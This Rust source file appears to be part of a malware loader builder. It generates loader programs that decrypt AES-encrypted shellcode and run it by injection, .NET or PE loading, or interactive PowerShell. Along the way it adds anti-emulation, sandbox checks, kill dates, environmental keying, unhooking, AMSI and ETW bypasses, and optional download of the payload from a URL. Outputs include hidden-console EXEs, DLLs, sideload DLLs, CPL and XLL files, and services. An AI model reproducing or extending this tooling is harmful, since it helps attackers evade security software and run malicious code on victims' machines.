use crate::output::OutputFormat;

#[allow(dead_code)]
pub struct LoaderConfig {
    pub anti_emulation: String,
    pub kill_date: String,
    pub sandbox_check: String,
    pub env_key: String,
    pub unhook: String,
    pub amsi_bypass: String,
    pub etw_bypass: String,
    pub payload_retrieval: String,
    pub decode: String,
    pub decrypt: String,
    pub injection: String,
    pub encoded_payload: String,
    pub decode_offset: i32,
    pub key_bytes: String,
    pub iv_bytes: String,
    pub use_dotnet: bool,
    pub use_pe: bool,
    pub interactive_ps: bool,
    pub use_syscalls: bool,
    pub output_format: OutputFormat,
}

pub fn render_loader_source(cfg: &LoaderConfig) -> String {
    let mut source = String::new();

    // File header based on output format
    match &cfg.output_format {
        OutputFormat::Exe | OutputFormat::Pic => {
            source.push_str("#![windows_subsystem = \"windows\"]\n\n");
        }
        OutputFormat::Service => {
            // Service doesn't hide console
        }
        _ => {}
    }

    // Use statements
    source.push_str("use std::ffi::c_void;\n\n");

    // Decode function
    if !cfg.decode.is_empty() {
        source.push_str(&cfg.decode);
        source.push_str("\n\n");
    }

    // Decrypt function
    source.push_str(&generate_decrypt_function());
    source.push('\n');

    // Syscall infrastructure (if needed)
    if cfg.use_syscalls {
        source.push_str(&crate::syscalls::syscall_resolver_snippet());
        source.push('\n');
    }

    // Main function body
    let body = generate_body(cfg);

    // For DLL-based formats, the body runs inside std::thread::spawn(|| { ... }).
    // std::process::exit(0) would kill the host process — use return instead
    // to just exit the thread.
    let body = match &cfg.output_format {
        OutputFormat::Dll | OutputFormat::Sideload { .. } | OutputFormat::Cpl | OutputFormat::Xll => {
            body.replace("std::process::exit(0)", "return")
        }
        _ => body,
    };

    match &cfg.output_format {
        OutputFormat::Exe | OutputFormat::Pic => {
            source.push_str(&format!("fn main() {{\n{}\n}}\n", body));
        }
        OutputFormat::Dll => {
            source.push_str(&crate::output::dll::dll_entry_snippet(&body));
        }
        OutputFormat::Sideload { .. } => {
            // Sideload is handled separately in builder
            source.push_str(&crate::output::dll::dll_entry_snippet(&body));
        }
        OutputFormat::Cpl => {
            source.push_str(&crate::output::cpl::cpl_entry_snippet(&body));
        }
        OutputFormat::Xll => {
            source.push_str(&crate::output::xll::xll_entry_snippet(&body));
        }
        OutputFormat::Service => {
            source.push_str(&crate::output::service::service_exe_snippet(&body));
        }
        OutputFormat::PowerShell => {
            // PowerShell output is handled differently
            source.push_str(&format!("fn main() {{\n{}\n}}\n", body));
        }
    }

    source
}

fn generate_body(cfg: &LoaderConfig) -> String {
    let mut body = String::new();

    // 1. Anti-emulation
    if !cfg.anti_emulation.is_empty() {
        body.push_str(&cfg.anti_emulation);
        body.push('\n');
    }

    // 2. Kill date check
    if !cfg.kill_date.is_empty() {
        body.push_str(&cfg.kill_date);
        body.push('\n');
    }

    // 3. Sandbox check
    if !cfg.sandbox_check.is_empty() {
        body.push_str(&cfg.sandbox_check);
        body.push('\n');
    }

    // 4. Environmental keying
    if !cfg.env_key.is_empty() {
        body.push_str(&cfg.env_key);
        body.push('\n');
    }

    // 5. Payload retrieval
    if !cfg.payload_retrieval.is_empty() {
        body.push_str(&cfg.payload_retrieval);
        body.push('\n');
    }

    // 6. Decode
    if !cfg.encoded_payload.is_empty() {
        body.push_str(&format!(
            "    let encoded_data = {};\n",
            cfg.encoded_payload
        ));
        body.push_str("    let encrypted_payload = decode_payload(encoded_data);\n");
        body.push('\n');
    }

    // 7. Decrypt
    body.push_str(&format!(
        "    let key: [u8; 32] = {};\n",
        cfg.key_bytes
    ));
    body.push_str(&format!(
        "    let iv: [u8; 16] = {};\n",
        cfg.iv_bytes
    ));
    body.push_str("    let shellcode = decrypt_aes256_cbc(&encrypted_payload, &key, &iv);\n");
    body.push('\n');

    // 8. Unhook
    if !cfg.unhook.is_empty() {
        body.push_str(&cfg.unhook);
        body.push('\n');
    }

    // 9. AMSI bypass
    if !cfg.amsi_bypass.is_empty() {
        body.push_str(&cfg.amsi_bypass);
        body.push('\n');
    }

    // 10. ETW bypass
    if !cfg.etw_bypass.is_empty() {
        body.push_str(&cfg.etw_bypass);
        body.push('\n');
    }

    // 11. Execution (injection / .NET load / PE load / interactive PS)
    if cfg.interactive_ps {
        body.push_str(&crate::interactive_ps::interactive_ps_snippet(
            !cfg.amsi_bypass.is_empty(),
            !cfg.etw_bypass.is_empty(),
        ));
    } else if cfg.use_dotnet {
        body.push_str(&crate::input::dotnet::dotnet_load_snippet(
            !cfg.amsi_bypass.is_empty(),
            !cfg.etw_bypass.is_empty(),
        ));
    } else if cfg.use_pe {
        body.push_str(&crate::input::pe::pe_load_snippet());
    } else {
        body.push_str(&cfg.injection);
    }

    body
}

fn generate_decrypt_function() -> String {
    r#"fn decrypt_aes256_cbc(ciphertext: &[u8], key: &[u8; 32], iv: &[u8; 16]) -> Vec<u8> {
    use aes::cipher::{block_padding::Pkcs7, BlockDecryptMut, KeyIvInit};
    type Aes256CbcDec = cbc::Decryptor<aes::Aes256>;

    let decryptor = Aes256CbcDec::new(key.into(), iv.into());
    decryptor
        .decrypt_padded_vec_mut::<Pkcs7>(ciphertext)
        .unwrap_or_else(|_| std::process::exit(0))
}
"#
    .to_string()
}

pub fn generate_loader_cargo_toml(output_format: &OutputFormat, uses_url: bool) -> String {
    let mut toml = String::from(
        r#"[package]
name = "loader"
version = "0.1.0"
edition = "2021"

[dependencies]
aes = "0.8"
cbc = { version = "0.1", features = ["alloc"] }
sha2 = "0.10"
windows-sys = { version = "0.61.2", features = [
    "Win32_Foundation",
    "Win32_Security",
    "Win32_System_Threading",
    "Win32_System_Memory",
    "Win32_System_Diagnostics_Debug",
    "Win32_System_Diagnostics_ToolHelp",
    "Win32_System_Registry",
    "Win32_System_LibraryLoader",
    "Win32_NetworkManagement_NetManagement",
    "Win32_Storage_FileSystem",
    "Win32_System_SystemInformation",
    "Win32_System_Com",
    "Win32_System_Services",
] }
"#,
    );

    match output_format {
        OutputFormat::Dll | OutputFormat::Sideload { .. } | OutputFormat::Cpl | OutputFormat::Xll => {
            toml.push_str(
                r#"
[lib]
crate-type = ["cdylib"]
"#,
            );
        }
        OutputFormat::Service => {}
        _ => {}
    }

    // Add reqwest if URL payload retrieval is used
    if uses_url {
        toml.push_str("reqwest = { version = \"0.11\", features = [\"blocking\"] }\n");
    }
    toml.push_str("\n[profile.release]\nopt-level = \"z\"\nlto = true\nstrip = true\n");

    toml
}
